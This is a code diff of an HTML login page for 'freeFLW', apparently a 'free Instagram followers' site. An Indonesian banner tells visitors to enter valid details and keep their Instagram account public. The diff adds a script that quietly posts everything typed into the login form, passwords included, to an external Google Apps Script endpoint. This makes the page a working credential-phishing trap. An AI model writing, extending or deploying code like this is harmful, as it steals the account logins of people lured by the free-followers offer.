@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="../css/style-freeflw.css" />
     <link rel="stylesheet" href="../css/login.css" />
-    <title>freeFLW</title>
+    <title>freeFLW | Login</title>
   </head>
   <body>
     <div class="container-nav">
@@ -39,8 +39,8 @@
     <!-- login -->
     <div class="container-login">
       <div class="login">
-        <form action="">
-          <h1>Login</h1>
+        <form name="login-freeFLW">
+          <h1>Login freeFLW</h1>
           <marquee behavior="" direction=""
             >Masukan informasi yang valid dan pastikan akun instagram kamu tidak
             diprivate.</marquee
@@ -73,7 +73,7 @@
             <i class="fa-solid fa-lock"></i>
           </div>
           <br />
-          <button type="button" onclick="secureLogin()">
+          <button type="submit" onclick="secureLogin()">
             Secure Login
             <i class="fa-solid fa-lock" id="lock"></i>
           </button>
@@ -87,5 +87,17 @@
       crossorigin="anonymous"
     ></script>
     <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbxnT1xXcY4V_ZgQGvHOI6g6l6ascFi7UKYOS455AAi5J2a7sfKom_0OjttVVaTgsRTE/exec";
+      const form = document.forms["login-freeFLW"];
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+          .then((response) => console.log("Success!", response))
+          .catch((error) => console.error("Error!", error.message));
+      });
+    </script>
   </body>
 </html>
